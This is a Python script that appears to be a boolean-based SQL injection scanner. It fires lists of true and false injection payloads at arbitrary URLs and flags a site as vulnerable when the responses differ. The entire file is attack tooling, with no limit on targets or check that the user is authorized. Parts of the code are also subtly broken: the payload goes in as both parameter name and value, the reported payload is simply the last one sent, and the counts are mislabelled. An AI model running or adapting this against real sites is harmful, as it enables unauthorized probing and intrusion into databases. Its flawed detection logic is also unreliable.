import requests
import random
import string
import time
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style, init
import warnings

init(autoreset=True)

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

TRUE_PAYLOADS = [
    "' AND 2*3*8=6*8 AND 'randomString'='randomString",
    "' AND 3*2>(1*5) AND 'randomString'='randomString",
    "' AND 3*2*0>=0 AND 'randomString'='randomString"
]

FALSE_PAYLOADS = [
    "' AND 2*3*8=6*9 AND 'randomString'='randomString",
    "' AND 3*3<(2*4) AND 'randomString'='randomString",
    "' AND (3*3*0)=(2*4*1*0) AND 'randomString'='randomString"
]

def generate_random_string(length=4):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def replace_placeholders(payload, rand_str):
    return payload.replace("randomString", rand_str)

def test_payload(url, payload):
    current_time = time.strftime('%H:%M:%S', time.localtime())
    print(f"{Style.BRIGHT}[{Fore.BLUE}{current_time}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Payload: {Fore.CYAN}{payload}{Style.RESET_ALL}")
    
    try:
        response = requests.get(url, params={payload: payload}, timeout=10)
        if response.status_code == 200:
            return response.text
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Error with URL {url}: {e}{Style.RESET_ALL}")
    return None

def is_vulnerable(url):
    true_signatures = []
    false_signatures = []
    rand_str = generate_random_string()

    for payload in TRUE_PAYLOADS:
        replaced_payload = replace_placeholders(payload, rand_str)
        true_signatures.append(test_payload(url, replaced_payload))

    for payload in FALSE_PAYLOADS:
        replaced_payload = replace_placeholders(payload, rand_str)
        false_signatures.append(test_payload(url, replaced_payload))
    
    true_signatures = [sig for sig in true_signatures if sig is not None]
    false_signatures = [sig for sig in false_signatures if sig is not None]

    if true_signatures and false_signatures:
        true_pattern = set(true_signatures)
        false_pattern = set(false_signatures)
        
        if true_pattern != false_pattern:
            print(f"\n{Style.BRIGHT}[{Fore.GREEN}VULN{Style.RESET_ALL}] URL: {url}")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Test Name{Style.RESET_ALL}]: Boolean-based SQLi")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Target URL{Style.RESET_ALL}]: {url}")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Payload Used{Style.RESET_ALL}]: {payload}")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Total Requests{Style.RESET_ALL}] - Success: {len(true_signatures)} | Failed: {len(false_signatures)}")
            return True

    print(f"{Fore.RED}[!] No Boolean Based vulnerability detected at: {url}{Style.RESET_ALL}")
    return False

def process_urls(urls):
    start_time = time.time()  
    for url in urls:
        current_time = time.strftime('%H:%M:%S', time.localtime())
        print(f"{Style.BRIGHT}[{Fore.BLUE}{current_time}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Testing URL: {url}")
        try:
            if is_vulnerable(url):
                print(f"\n{Style.BRIGHT}[{Fore.YELLOW}Vulnerable URL Found{Style.RESET_ALL}] {url}")
                break 
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}Process interrupted by user.{Style.RESET_ALL}")
            while True:
                user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next URL or 'e' to exit: {Style.RESET_ALL}")
                if user_input.lower() == 'n':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Continuing with next URL...{Style.RESET_ALL}")
                    break
                elif user_input.lower() == 'e':
                    print(f"{Style.BRIGHT}{Fore.RED}Exiting...{Style.RESET_ALL}")
                    return
                else:
                    continue
    end_time = time.time() 
    elapsed_time = (end_time - start_time) / 60  
    print(f"\n{Style.BRIGHT}[{Fore.YELLOW}Summary{Style.RESET_ALL}] Total time taken: {elapsed_time:.2f} minutes")

